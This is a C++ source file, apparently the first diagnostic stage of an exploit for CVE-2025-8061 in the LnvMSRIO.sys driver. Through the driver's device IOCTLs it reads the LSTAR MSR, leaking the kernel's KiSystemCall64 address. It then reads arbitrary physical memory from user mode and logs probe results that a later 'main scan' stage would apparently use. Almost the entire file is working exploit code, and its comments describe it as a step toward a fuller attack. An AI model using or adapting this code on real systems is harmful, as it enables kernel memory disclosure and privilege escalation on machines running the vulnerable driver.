/*
 * 00_diag.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — Diagnostic / Safe-Range Probe
 *
 * PURPOSE: Identify exactly which physical addresses cause BSOD on this VM.
 *
 * Writes ALL output to diag_output.txt (fflush after each line) so the log
 * survives BSOD + reboot.  Run this FIRST to understand your physical layout,
 * then share the log for further analysis.
 *
 * Tests performed:
 *   1. Open driver device
 *   2. Read LSTAR MSR → confirms MSR primitive works
 *   3. GetPhysRanges() → show what the registry reports
 *   4. PhysRead at progressively higher addresses (stops well below 3 GB)
 *   5. Show first 8 bytes of each successful read
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:00_diag.exe 00_diag.cpp
 *      /link kernel32.lib advapi32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME     L"\\\\.\\WinMsrDev"
#define IOCTL_MSR_READ  0x9c402084u
#define IOCTL_PHYS_READ 0x9c406104u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

// ─── Logging (console + file, flushed every line) ────────────────────────────

static FILE *g_log = nullptr;

static void Log(const char *fmt, ...)
{
    char buf[512];
    va_list va;
    va_start(va, fmt);
    vsnprintf(buf, sizeof(buf), fmt, va);
    va_end(va);
    fputs(buf, stdout);
    fflush(stdout);
    if (g_log) { fputs(buf, g_log); fflush(g_log); }
}

// ─── IOCTL structs ───────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct MsrReadIn  { DWORD Register; };
struct MsrReadOut { UINT64 Value; };
struct PhysReadIn { UINT64 PhysAddr; DWORD AccessSize; DWORD Count; };
#pragma pack(pop)

static bool ReadMSR(DWORD msr, uint64_t *out)
{
    MsrReadIn in = { msr };
    MsrReadOut res = {};
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, IOCTL_MSR_READ, &in, sizeof(in),
                         &res, sizeof(res), &got, nullptr) || got < 8)
        return false;
    *out = res.Value;
    return true;
}

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ, &in, sizeof(in),
                           buf, len, &got, nullptr) && (got == len);
}

// ─── Physical memory range enumeration ───────────────────────────────────────

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }

    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;
            off += 4;
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) { out[n].base = (uint64_t)st.QuadPart; out[n].size = len; n++; }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    g_log = fopen("diag_output.txt", "w");

    Log("=== CVE-2025-8061 | LnvMSRIO.sys | 00 - Diagnostic ===\n");
    Log("Output also written to diag_output.txt\n\n");

    // ── Step 1: open device ───────────────────────────────────────────────────
    Log("[1] Opening device %ls\n", DEVICE_NAME);
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        Log("    FAIL  error=%lu\n", GetLastError());
        Log("    → Is LnvMSRIO.sys loaded? Run: sc start LnvMSRIO\n");
        if (g_log) fclose(g_log);
        return 1;
    }
    Log("    OK  handle=%p\n\n", g_dev);

    // ── Step 2: LSTAR MSR ─────────────────────────────────────────────────────
    Log("[2] LSTAR MSR (0xC0000082)\n");
    uint64_t lstar = 0;
    if (!ReadMSR(0xC0000082, &lstar))
        Log("    FAIL  error=%lu\n\n", GetLastError());
    else
        Log("    0x%016llX  (KiSystemCall64)\n\n", lstar);

    // ── Step 3: physical range registry key ───────────────────────────────────
    Log("[3] GetPhysRanges() from registry\n");
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    Log("    Registry returned %d range(s)\n", n);
    for (int i = 0; i < n; i++)
        Log("    [%d] 0x%010llX - 0x%010llX  (%5llu MB)\n",
            i, ranges[i].base, ranges[i].base + ranges[i].size,
            ranges[i].size >> 20);
    if (n == 0)
        Log("    WARNING: registry key not found or empty — fallback will be used\n");
    Log("\n");

    // ── Step 4: GlobalMemoryStatusEx ─────────────────────────────────────────
    Log("[4] GlobalMemoryStatusEx\n");
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    Log("    ullTotalPhys = 0x%llX  (%llu MB)\n",
        ms.ullTotalPhys, ms.ullTotalPhys >> 20);
    Log("    ullAvailPhys = 0x%llX  (%llu MB)\n\n",
        ms.ullAvailPhys, ms.ullAvailPhys >> 20);

    // ── Step 5: probe specific physical addresses ─────────────────────────────
    // Stops at 0xBF000000 (3 GB - 16 MB) — well clear of the MMIO hole.
    // Address causing BSOD = last entry in log before reboot.
    struct { uint64_t pa; const char *desc; } probes[] = {
        { 0x0000001000ULL, "0x000001000  (  1 KB - real-mode IVT)" },
        { 0x0000008000ULL, "0x000008000  ( 32 KB)" },
        { 0x0000010000ULL, "0x000010000  ( 64 KB)" },
        { 0x0000080000ULL, "0x000080000  (512 KB - VGA ROM area)" },
        { 0x0000100000ULL, "0x000100000  (  1 MB - conventional RAM top)" },
        { 0x0000200000ULL, "0x000200000  (  2 MB)" },
        { 0x0001000000ULL, "0x001000000  ( 16 MB)" },
        { 0x0004000000ULL, "0x004000000  ( 64 MB)" },
        { 0x0008000000ULL, "0x008000000  (128 MB)" },
        { 0x0010000000ULL, "0x010000000  (256 MB)" },
        { 0x0020000000ULL, "0x020000000  (512 MB)" },
        { 0x0040000000ULL, "0x040000000  (  1 GB)" },
        { 0x0060000000ULL, "0x060000000  (1.5 GB)" },
        { 0x0080000000ULL, "0x080000000  (  2 GB)" },
        { 0x00A0000000ULL, "0x0A0000000  (2.5 GB)" },
        { 0x00B0000000ULL, "0x0B0000000  (2.75 GB)" },
        { 0x00BF000000ULL, "0x0BF000000  (3 GB - 16 MB) ← last safe probe" },
    };

    Log("[5] PhysRead probe (16 bytes each, stops at 3 GB - 16 MB)\n");
    Log("    If BSOD occurs, check which address was LAST logged above 'OK'\n\n");

    uint8_t buf[16];
    for (auto &p : probes) {
        Log("    %-52s  ", p.desc);
        memset(buf, 0, sizeof(buf));
        bool ok = PhysRead(p.pa, buf, sizeof(buf));
        if (ok) {
            Log("OK   ");
            for (int i = 0; i < 8; i++) Log("%02X ", buf[i]);
            Log("\n");
        } else {
            Log("FAIL (DeviceIoControl error=%lu)\n", GetLastError());
        }
    }

    Log("\n[+] All probes completed without BSOD.\n");
    Log("    → Physical reads work. BSOD during main scan = bad fallback range.\n");
    Log("    → Share diag_output.txt for further analysis.\n");

    if (g_log) fclose(g_log);
    CloseHandle(g_dev);
    return 0;
}
